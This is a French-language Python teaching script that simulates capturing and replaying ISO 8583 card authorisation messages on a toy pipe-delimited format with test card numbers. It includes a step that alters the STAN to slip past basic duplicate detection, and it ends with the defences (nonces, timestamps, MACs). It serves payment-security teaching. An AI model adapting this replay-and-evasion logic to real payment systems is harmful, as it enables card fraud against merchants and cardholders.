#!/usr/bin/env python3
"""
Scénario 1 : Replay Capturer
EXPLOIT : Capture et rejeu de messages ISO 8583

⚠️ USAGE PÉDAGOGIQUE UNIQUEMENT

Usage: python replay-capturer.py
"""

import hashlib
import time
import json
from dataclasses import dataclass, asdict
from typing import List, Dict, Optional
from datetime import datetime, timedelta


@dataclass
class CapturedMessage:
    """Message capturé pour rejeu"""
    timestamp: float
    raw_data: str
    mti: str
    pan_masked: str
    amount: int
    stan: str
    message_hash: str
    replay_count: int = 0


class ReplayCapturer:
    """Classe pour capturer et rejouer des messages"""
    
    def __init__(self, capture_window_seconds: int = 300):
        self.captured: List[CapturedMessage] = []
        self.capture_window = capture_window_seconds
        self.replayed_hashes: set = set()
    
    def capture(self, raw_message: str) -> CapturedMessage:
        """Capture un message pour potentiel rejeu"""
        parsed = self._parse_message(raw_message)
        
        msg_hash = hashlib.sha256(raw_message.encode()).hexdigest()[:16]
        
        captured = CapturedMessage(
            timestamp=time.time(),
            raw_data=raw_message,
            mti=parsed.get('mti', ''),
            pan_masked=self._mask_pan(parsed.get('pan', '')),
            amount=int(parsed.get('amount', 0)),
            stan=parsed.get('stan', ''),
            message_hash=msg_hash
        )
        
        self.captured.append(captured)
        
        print(f"[Capturer] Message capturé:")
        print(f"   Hash: {msg_hash}")
        print(f"   MTI: {captured.mti}")
        print(f"   PAN: {captured.pan_masked}")
        print(f"   Montant: {captured.amount / 100:.2f} EUR")
        
        return captured
    
    def _parse_message(self, raw: str) -> Dict:
        """Parse un message ISO 8583 simplifié"""
        parts = raw.split('|')
        return {
            'mti': parts[0] if len(parts) > 0 else '',
            'pan': parts[1] if len(parts) > 1 else '',
            'processing_code': parts[2] if len(parts) > 2 else '',
            'amount': parts[3] if len(parts) > 3 else '0',
            'stan': parts[4] if len(parts) > 4 else ''
        }
    
    def _mask_pan(self, pan: str) -> str:
        """Masque un PAN pour affichage"""
        if len(pan) < 4:
            return '****'
        return f"****{pan[-4:]}"
    
    def get_replayable_messages(self, min_amount: int = 0) -> List[CapturedMessage]:
        """Retourne les messages éligibles au rejeu"""
        now = time.time()
        cutoff = now - self.capture_window
        
        replayable = [
            msg for msg in self.captured
            if msg.timestamp > cutoff
            and msg.amount >= min_amount
            and msg.mti == '0100'  # Uniquement les autorisations
            and msg.message_hash not in self.replayed_hashes
        ]
        
        return sorted(replayable, key=lambda m: -m.amount)
    
    def replay(self, message: CapturedMessage, modify_stan: bool = True) -> str:
        """Rejoue un message capturé"""
        if message.message_hash in self.replayed_hashes:
            print(f"[Capturer] ⚠️ Message déjà rejoué: {message.message_hash}")
            return ""
        
        replayed_data = message.raw_data
        
        if modify_stan:
            # Modifier le STAN pour éviter la détection basique
            new_stan = str(int(time.time() * 1000) % 1000000).zfill(6)
            parts = replayed_data.split('|')
            if len(parts) > 4:
                parts[4] = new_stan
            replayed_data = '|'.join(parts)
        
        message.replay_count += 1
        self.replayed_hashes.add(message.message_hash)
        
        print(f"\n[Capturer] 🔄 REJOUÉ:")
        print(f"   Hash original: {message.message_hash}")
        print(f"   Montant: {message.amount / 100:.2f} EUR")
        print(f"   Nb rejeux: {message.replay_count}")
        
        return replayed_data
    
    def get_statistics(self) -> Dict:
        """Retourne les statistiques de capture"""
        total_amount = sum(msg.amount for msg in self.captured)
        replayed_amount = sum(
            msg.amount for msg in self.captured 
            if msg.message_hash in self.replayed_hashes
        )
        
        return {
            'total_captured': len(self.captured),
            'total_replayed': len(self.replayed_hashes),
            'total_amount_captured': total_amount,
            'total_amount_replayed': replayed_amount,
            'capture_window_seconds': self.capture_window
        }


def simulate_replay_attack():
    """Simule une attaque par rejeu"""
    print("=" * 60)
    print("  🔄 REPLAY CAPTURER - Scénario 1")
    print("  ⚠️  USAGE STRICTEMENT PÉDAGOGIQUE")
    print("=" * 60)
    
    capturer = ReplayCapturer(capture_window_seconds=60)
    
    # Simuler la capture de messages
    test_messages = [
        '0100|4111111111111111|000000|000050000|100001|',
        '0100|5500000000000004|000000|000025000|100002|',
        '0100|340000000000009|000000|000150000|100003|',
        '0110|4111111111111111|000000|000050000|100001|00|ABC123|',  # Réponse (ignorée)
        '0100|6011000000000004|000000|000075000|100004|',
    ]
    
    print("\n📥 PHASE 1: Capture des messages\n")
    for msg in test_messages:
        capturer.capture(msg)
        time.sleep(0.1)
    
    # Obtenir les messages rejouables
    print("\n\n📋 PHASE 2: Analyse des messages capturés\n")
    replayable = capturer.get_replayable_messages(min_amount=10000)
    
    print(f"Messages rejouables trouvés: {len(replayable)}")
    for msg in replayable:
        print(f"   - {msg.pan_masked}: {msg.amount/100:.2f} EUR (hash: {msg.message_hash})")
    
    # Rejouer le message avec le montant le plus élevé
    print("\n\n💀 PHASE 3: Attaque par rejeu\n")
    if replayable:
        target = replayable[0]  # Plus gros montant
        print(f"Cible sélectionnée: {target.amount/100:.2f} EUR")
        
        replayed = capturer.replay(target, modify_stan=True)
        print(f"\nMessage rejoué:\n   {replayed[:50]}...")
        
        # Tenter un second rejeu (doit échouer)
        print("\nTentative de double rejeu:")
        capturer.replay(target)
    
    # Statistiques
    print("\n" + "=" * 60)
    print("  📊 STATISTIQUES")
    print("=" * 60)
    stats = capturer.get_statistics()
    print(f"""
   Messages capturés:  {stats['total_captured']}
   Messages rejoués:   {stats['total_replayed']}
   Montant capturé:    {stats['total_amount_captured']/100:.2f} EUR
   Montant rejoué:     {stats['total_amount_replayed']/100:.2f} EUR
""")
    
    print("-" * 60)
    print("  💡 POURQUOI CETTE ATTAQUE FONCTIONNE:")
    print("-" * 60)
    print("""
  1. Les messages ne contiennent PAS de nonce/timestamp unique
  2. Le STAN peut être modifié sans invalider le message
  3. Pas de MAC pour détecter les modifications
  
  ✅ SOLUTIONS:
  - Ajouter un timestamp avec courte validité
  - Implémenter un nonce unique par transaction
  - Maintenir une liste des STAN utilisés
  - Vérifier le MAC sur tous les champs
""")
    print("=" * 60)


if __name__ == '__main__':
    simulate_replay_attack()
